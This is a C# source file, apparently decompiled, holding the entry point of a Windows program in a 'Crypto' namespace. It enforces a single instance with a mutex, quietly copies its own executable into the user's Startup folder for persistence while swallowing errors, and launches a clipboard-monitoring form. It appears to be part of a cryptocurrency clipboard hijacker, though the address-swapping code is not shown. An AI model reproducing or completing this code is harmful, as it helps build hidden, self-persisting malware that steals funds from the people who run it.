﻿using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Crypto.Crypto
{
	public class Program
	{
		[DebuggerNonUserCode]
		public Program()
		{
		}

		[STAThread]
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void Main()
		{
			bool flag = false;
			Addresses.mtx = new Mutex(true, Addresses.Mutexx, out flag);
			if (!flag)
			{
				ProjectData.EndApp();
			}
			if (Operators.CompareString(Addresses.startup, "yes", false) == 0)
			{
				try
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileNameWithoutExtension(Application.ExecutablePath) + ".exe";
					if (!File.Exists(text))
					{
						File.Copy(Application.ExecutablePath, text);
						File.SetAttributes(text, FileAttributes.Temporary);
					}
				}
				catch (Exception ex)
				{
				}
			}
			Program.Run();
		}

		public static void Run()
		{
			Application.Run(new ClipboardNotification.NotificationForm());
		}
	}
}
